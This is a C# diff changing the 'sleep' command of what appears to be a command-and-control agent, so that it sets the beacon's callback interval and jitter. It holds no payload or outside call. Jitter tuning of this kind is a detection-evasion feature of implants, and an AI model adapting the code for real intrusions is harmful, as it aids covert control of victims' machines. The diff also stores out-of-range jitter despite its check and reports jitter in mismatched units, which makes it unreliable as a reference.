@@ -12,27 +12,32 @@ namespace Agent.Commands
     {
         public override string Name => "sleep";
 
-        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
+        public override void InnerExecute(AgentTask task, AgentCommandContext context)
         {
-            int delay = 10;
-            if (task.SplittedArgs.Length > 0)
-                delay = int.Parse(task.SplittedArgs[0]);
-
-            delay = delay * 1000;
-            int chunk = delay / 100;
-
-            int spent = 0;
-            int completion = 0;
-            while (spent < delay)
+            if (task.SplittedArgs.Count() == 0)
             {
-                Thread.Sleep(chunk);
-                completion++;
-                spent += chunk;
-                result.Info = $"Completed at {completion}%";
-                commm.SendResult(result);
+                context.Result.Result = $"Delay is {context.Agent.Communicator.MessageService.AgentMetaData.SleepInterval}s +/- {context.Agent.Communicator.MessageService.AgentMetaData.SleepJitter*100}%";
+                return;
             }
 
-            result.Result = $"Awaited for {delay}ms";
+            int delay = int.Parse(task.SplittedArgs[0]);
+            int jitter = 0;
+            if (task.SplittedArgs.Count() > 1)
+            {
+                jitter = int.Parse(task.SplittedArgs[1]);
+            }
+
+            if(jitter < 0 || jitter >= 100)
+            {
+                context.Result.Result = "Jitter is not correct (should be 0-99%)";
+            }
+
+            context.Agent.Communicator.MessageService.AgentMetaData.SleepInterval = delay;
+            context.Agent.Communicator.MessageService.AgentMetaData.SleepJitter = jitter;
+
+            context.Result.Result = $"Delay is set to {context.Agent.Communicator.MessageService.AgentMetaData.SleepInterval}s - {context.Agent.Communicator.MessageService.AgentMetaData.SleepJitter}%";
+
+            this.SendMetadataWithResult = true;
         }
     }
 }
